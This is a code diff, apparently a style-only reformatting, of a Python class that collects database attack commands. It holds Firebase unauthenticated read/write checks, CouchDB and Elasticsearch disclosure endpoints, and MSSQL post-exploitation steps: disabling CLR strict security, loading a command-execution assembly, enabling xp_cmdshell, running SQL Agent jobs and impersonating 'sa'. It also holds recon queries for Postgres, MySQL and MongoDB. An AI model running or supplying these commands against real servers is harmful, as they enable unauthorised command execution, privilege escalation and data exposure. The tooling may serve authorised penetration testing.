@@ -25,20 +25,20 @@ class DatabaseIntelligence:
             "firebase": {
                 "read_test_url": "https://{app_id}.firebaseio.com/.json",
                 "write_test_method": "PUT",
-                "write_test_payload": "{\"vuln_check\": \"insecure_access_detected\"}",
+                "write_test_payload": '{"vuln_check": "insecure_access_detected"}',
                 "config_regex": (
                     r"\"apiKey\":\s*\"([^\"]+)\",\s*\"authDomain\":\s*\"([^\"]+)\","
                     r"\s*\"databaseURL\":\s*\"([^\"]+)\""
-                )
+                ),
             },
             "couchdb": {
                 "unauth_access_url": "http://{host}:5984/_all_dbs",
-                "config_disclosure_url": "http://{host}:5984/_config"
+                "config_disclosure_url": "http://{host}:5984/_config",
             },
             "elasticsearch": {
                 "index_list_url": "http://{host}:9200/_cat/indices?v",
-                "mapping_disclosure_url": "http://{host}:9200/_mapping"
-            }
+                "mapping_disclosure_url": "http://{host}:9200/_mapping",
+            },
         }
 
     @staticmethod
@@ -56,7 +56,7 @@ class DatabaseIntelligence:
                 "SELECT distinct b.name FROM sys.server_permissions a "
                 "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
                 "WHERE a.permission_name = 'IMPERSONATE';"
-            )
+            ),
         }
 
     @staticmethod
@@ -68,16 +68,16 @@ class DatabaseIntelligence:
                 "setup": [
                     "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                     "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;",
-                    "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"
+                    "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;",
                 ],
                 "create_assembly": "CREATE ASSEMBLY myAssembly FROM 0x4D5A...; -- (Ported from yolo-mssqlclient)",
                 "create_procedure": (
                     "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) "
                     "AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];"
-                )
+                ),
             },
             "sp_start_job": "EXEC msdb.dbo.sp_start_job @job_name = '...'; -- Blind execution via SQL Agent",
-            "impersonate_sa": "EXECUTE AS LOGIN = 'sa';"
+            "impersonate_sa": "EXECUTE AS LOGIN = 'sa';",
         }
 
     @staticmethod
@@ -85,7 +85,7 @@ class DatabaseIntelligence:
         """Commands to enable xp_cmdshell (requires sysadmin)."""
         return [
             "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
-            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
         ]
 
     @staticmethod
@@ -95,7 +95,7 @@ class DatabaseIntelligence:
             "get_version": "SELECT version()",
             "get_databases": "SELECT datname FROM pg_database",
             "get_tables": "SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog'",
-            "get_roles": "SELECT usename FROM pg_user"
+            "get_roles": "SELECT usename FROM pg_user",
         }
 
     @staticmethod
@@ -105,14 +105,10 @@ class DatabaseIntelligence:
             "get_version": "SELECT @@version",
             "get_databases": "SHOW DATABASES",
             "get_users": "SELECT user FROM mysql.user",
-            "get_file_priv": "SELECT user, file_priv FROM mysql.user WHERE user = 'CURRENT_USER'"
+            "get_file_priv": "SELECT user, file_priv FROM mysql.user WHERE user = 'CURRENT_USER'",
         }
 
     @staticmethod
     def get_mongodb_recon_commands() -> List[str]:
         """Commands for MongoDB enumeration (Port 27017)."""
-        return [
-            "db.adminCommand('listDatabases')",
-            "db.getUsers()",
-            "db.getCollectionNames()"
-        ]
+        return ["db.adminCommand('listDatabases')", "db.getUsers()", "db.getCollectionNames()"]
